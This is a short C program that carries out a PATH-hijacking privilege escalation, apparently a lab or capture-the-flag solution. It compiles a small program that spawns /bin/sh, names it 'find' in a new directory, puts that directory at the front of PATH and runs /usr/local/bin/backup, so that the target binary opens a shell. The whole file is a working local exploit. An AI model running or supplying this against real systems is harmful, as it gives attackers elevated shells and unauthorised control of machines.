#include <stdio.h>
#include <stdlib.h>

int main()
{

	system("mkdir ~/superpath");
	system("echo -e \'#include <stdlib.h>\\nint main(){system(\"/bin/sh\");return 0;}\' > opensh.c");
	system("gcc -Wall opensh.c -o ~/superpath/find");
	system("export PATH=~/superpath:$PATH && /usr/local/bin/backup ls");

	return 0;
}
